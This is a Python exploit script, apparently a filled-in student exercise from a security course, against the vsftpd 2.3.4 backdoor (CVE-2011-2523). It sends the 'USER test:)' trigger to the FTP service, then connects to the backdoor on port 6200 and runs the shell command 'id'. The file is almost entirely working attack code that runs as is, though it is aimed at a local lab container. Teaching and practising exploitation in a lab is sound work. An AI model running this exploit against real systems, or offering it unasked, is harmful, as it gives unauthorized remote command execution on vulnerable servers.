
# S13_Part09_Script_FTP_Backdoor_Exploit.py
#
# Exploit for the vsftpd 2.3.4 vulnerability (CVE-2011-2523)
#
# Flow:
#   1. Connect to FTP on port 2121
#   2. Send username "test:)"
#   3. Send an arbitrary password
#   4. Connect to the backdoor on port 6200
#   5. Send a shell command ("id", "whoami")
#
# STUDENT TASK:
# Complete the sections marked with "STUDENT CODE".

import socket
import time

FTP_HOST = "127.0.0.1"   # or your host IP
FTP_PORT = 2121          # host port mapped to container's 21
BACKDOOR_PORT = 6200     # but see note below
TIMEOUT = 2

def trigger_backdoor():
    """Activates the backdoor by sending USER test:)"""
    print("[*] Connecting to FTP service...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(TIMEOUT)

    # STUDENT CODE START
    s.connect((FTP_HOST, FTP_PORT))

    banner = s.recv(1024).decode()
    print("[+] FTP Banner:", banner.strip())

    # Send the command that activates the backdoor
    s.sendall(b"USER test:)\r\n")
    s.sendall(b"PASS anything\r\n")

    # Short pause for the server to start the backdoor
    time.sleep(0.2)

    s.close()
    # STUDENT CODE END

    print("[+] Backdoor triggered.")
    return True


def connect_backdoor():
    """Connects to the backdoor port and executes a command."""
    print("[*] Connecting to backdoor on port 6200...")

    # STUDENT CODE START
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(TIMEOUT)
    s.connect((FTP_HOST, BACKDOOR_PORT))

    # Send a shell command
    s.sendall(b"id\n")

    response = s.recv(1024).decode()
    s.close()
    # STUDENT CODE END

    print("[+] Backdoor response:")
    print(response)
    return response


def main():
    print("=== VSFTPD 2.3.4 Exploit ===")

    try:
        trigger_backdoor()
        connect_backdoor()
    except Exception as e:
        print("[-] Exploit failed:", e)


if __name__ == "__main__":
    main()
